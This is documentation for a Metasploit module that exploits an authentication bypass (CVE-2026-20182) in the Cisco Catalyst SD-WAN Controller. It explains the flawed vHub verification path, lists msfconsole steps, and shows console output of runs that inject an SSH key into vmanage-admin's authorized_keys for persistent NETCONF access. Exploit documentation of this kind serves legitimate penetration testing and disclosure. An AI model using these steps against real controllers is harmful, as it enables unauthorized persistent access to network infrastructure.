## Vulnerable Application

This module exploits CVE-2026-20182, an authentication bypass vulnerability in the Cisco
Catalyst SD-WAN Controller. The vulnerability exists in the `vdaemon` DTLS
control-plane service running on UDP port 12346.

The `vbond_proc_challenge_ack()` function implements device-type-specific verification
through a series of conditional blocks, but contains no code path for device type 2
(vHub). After a DTLS handshake using any self-signed certificate, an attacker sends a
`CHALLENGE_ACK` (msg_type=9) with the vHub device type encoded in the protocol header.
The function falls through all verification checks and unconditionally sets
`peer->authenticated = 1`.

An attacker can:
1. Connect via DTLS 1.2 using a self-signed certificate (the server performs no certificate validation at the handshake stage)
2. Send a `CHALLENGE_ACK` message with device type set to vHub (type 2)
3. Send a `Hello` message to complete the handshake as a trusted peer without any legitimate credentials

Once authenticated, the module leverages a `VMANAGE_TO_PEER` message to inject an SSH
public key into the `/home/vmanage-admin/.ssh/authorized_keys` file, providing persistent
SSH access to the controller's NETCONF service on port 830.

### Affected Versions

The vulnerability affects Cisco Catalyst SD-WAN Controller 20.12.6.1 and earlier.
Consult
[Cisco's security advisory](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW)
for a complete list of affected versions and patches.

## Verification Steps

1. Start `msfconsole`
2. `use auxiliary/admin/networking/cisco_sdwan_vhub_auth_bypass`
3. `set RHOSTS <target_ip>`
4. Optionally, `set DOMAIN_ID <domain_id>` and `set SITE_ID <site_id>` if you know the target's SD-WAN topology
5. `check` to verify the target is vulnerable
6. `run` to exploit the vulnerability and inject an SSH public key
7. Use the generated SSH private key to connect to the NETCONF service: `ssh -i <key_path> vmanage-admin@<target_ip> -p 830`

## Options

### DOMAIN_ID

The SD-WAN domain ID to use in protocol messages. Default: `1`.

This value must match the domain ID configured on the target controller. In most
deployments, the default value of 1 is used. If you receive a `TEAR_DOWN` message after
sending `Hello`, try adjusting this value.

### SITE_ID

The SD-WAN site ID to use in protocol messages. Default: `100`.

This value identifies the site in the SD-WAN topology. The default value should work in
most cases, but if the exploit fails, you may need to adjust this based on knowledge of
the target's SD-WAN configuration.

### SSH_PUBLIC_KEY_FILE

Path to an existing SSH public key file (in OpenSSH format) to inject into the controller.

If not set, the module will automatically generate a new RSA 2048-bit SSH keypair. Using
an existing key can be useful if you want to maintain access using a key you already
control.

## Scenarios

### Cisco Catalyst SD-WAN Controller 20.12.6.1 (Default Configuration)

In this scenario, we target a Cisco Catalyst SD-WAN Controller with default settings. The module
automatically generates an SSH keypair and injects the public key.

```
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > show options

Module options (auxiliary/admin/networking/cisco_sdwan_vhub_auth_bypass):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   DOMAIN_ID            1                yes       SD-WAN domain ID
   RHOSTS               192.168.80.11    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT                12346            yes       The target port (UDP)
   SITE_ID              100              yes       SD-WAN site ID
   SSH_PUBLIC_KEY_FILE                   no        Path to an existing SSH public key file to inject


View the full module info with the info, or info -d command.

msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > check
[+] 192.168.80.11:12346 - The target is vulnerable. Authentication bypass succeeded - vHub CHALLENGE_ACK accepted without verification
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > run
[*] Running module against 192.168.80.11
[*] Phase 1: DTLS handshake with self-signed certificate
[*] DTLS handshake succeeded (self-signed cert accepted)
[*] Phase 2: Waiting for CHALLENGE from server
[*] CHALLENGE received (580 bytes of challenge data)
[*] Phase 3: Sending CHALLENGE_ACK as vHub (authentication bypass)
[*] Phase 4: Waiting for server response to CHALLENGE_ACK
[!] No immediate response (server may be waiting for our Hello)
[*] Phase 5: Sending Hello as authenticated peer
[+] Hello response received - authenticated as vHub peer
[*] Phase 6: Injecting SSH public key into vmanage-admin authorized_keys
[*] Generating RSA 2048-bit SSH keypair
[*] SSH private key saved to loot: /home/user/.msf4/loot/20260422120000_default_192.168.80.11_cisco.sdwan.sshk_123456.pem
[+] Connect to NETCONF via:
ssh -i /home/user/.msf4/loot/20260422120000_default_192.168.80.11_cisco.sdwan.sshk_123456.pem vmanage-admin@192.168.80.11 -p 830
[*] Server responded with: REGISTER_TO_VMANAGE (key has been injected)
[+] Authentication bypass and SSH key injection completed!
[*] Auxiliary module execution completed
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) >

```

After the module completes, SSH access to the NETCONF service is available:

```
$ chmod 600 /home/user/.msf4/loot/20260422120000_default_192.168.80.11_cisco.sdwan.sshk_123456.pem
$ ssh -i /home/user/.msf4/loot/20260422120000_default_192.168.80.11_cisco.sdwan.sshk_123456.pem vmanage-admin@192.168.80.11 -p 830

viptela 20.12.6.1

<?xml version="1.0" encoding="UTF-8"?>
<hello xmlns="urn:ietf:params:xml:ns:netconf:base:1.0">
<capabilities>
<capability>urn:ietf:params:netconf:base:1.0</capability>
<capability>urn:ietf:params:netconf:base:1.1</capability>
...
</capabilities>
<session-id>30</session-id></hello>]]>]]>
```

### Cisco Catalyst SD-WAN Controller 20.12.6.1 - Injecting an Existing SSH Public Key

In this scenario, we supply an existing SSH public key so that the injected key matches
a private key we already control.

```
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > set RHOSTS 192.168.80.11
RHOSTS => 192.168.80.11
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > set SSH_PUBLIC_KEY_FILE /home/user/.ssh/id_rsa.pub
SSH_PUBLIC_KEY_FILE => /home/user/.ssh/id_rsa.pub
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) > run
[*] Running module against 192.168.80.11
[*] Phase 1: DTLS handshake with self-signed certificate
[*] DTLS handshake succeeded (self-signed cert accepted)
[*] Phase 2: Waiting for CHALLENGE from server
[*] CHALLENGE received (580 bytes of challenge data)
[*] Phase 3: Sending CHALLENGE_ACK as vHub (authentication bypass)
[*] Phase 4: Waiting for server response to CHALLENGE_ACK
[!] No immediate response (server may be waiting for our Hello)
[*] Phase 5: Sending Hello as authenticated peer
[+] Hello response received - authenticated as vHub peer
[*] Phase 6: Injecting SSH public key into vmanage-admin authorized_keys
[*] Using SSH public key from /home/user/.ssh/id_rsa.pub
[+] Use: ssh -i <SSH_PRIVATE_KEY_FILE> vmanage-admin@192.168.80.11 -p 830
[*] Server responded with: REGISTER_TO_VMANAGE (key has been injected)
[+] Authentication bypass and SSH key injection completed!
[*] Auxiliary module execution completed
msf auxiliary(admin/networking/cisco_sdwan_vhub_auth_bypass) >

```
